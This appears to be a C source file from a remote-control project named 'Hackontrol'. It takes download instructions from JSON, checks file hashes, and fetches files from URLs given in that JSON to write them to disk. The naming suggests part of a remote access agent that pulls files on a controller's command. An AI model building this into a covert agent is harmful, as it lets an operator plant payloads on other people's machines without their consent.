#include <libhackontrol.h>
#include <libhackontrolcurl.h>
#include "execute.h"

static void download(const cJSON* const root) {
	if(!root || !cJSON_IsObject(root)) {
		return;
	}

	LPWSTR file = ExecuteGetFile(root);

	if(!file) {
		return;
	}

	BOOL match = HashFileCheck(root, file);

	if(match) {
		goto freeFile;
	}

	cJSON* urlField = cJSON_GetObjectItem(root, "url");

	if(!urlField || !cJSON_IsString(urlField)) {
		goto freeFile;
	}

	LPSTR url = cJSON_GetStringValue(urlField);

	if(!url) {
		goto freeFile;
	}

	DATASTREAM stream = {0};

	if(!HackontrolDownload(url, &stream, TRUE, TRUE)) {
		goto freeFile;
	}

	HackontrolWriteFile(file, stream.data, stream.size);
	KHOPANStreamFree(&stream);
freeFile:
	LocalFree(file);
}

void ExecuteDownload(const cJSON* const root) {
	cJSON* file = cJSON_GetObjectItem(root, "file");

	if(!file) {
		return;
	}

	if(!cJSON_IsArray(file)) {
		download(file);
		return;
	}

	for(int i = 0; i < cJSON_GetArraySize(file); i++) {
		download(cJSON_GetArrayItem(file, i));
	}
}
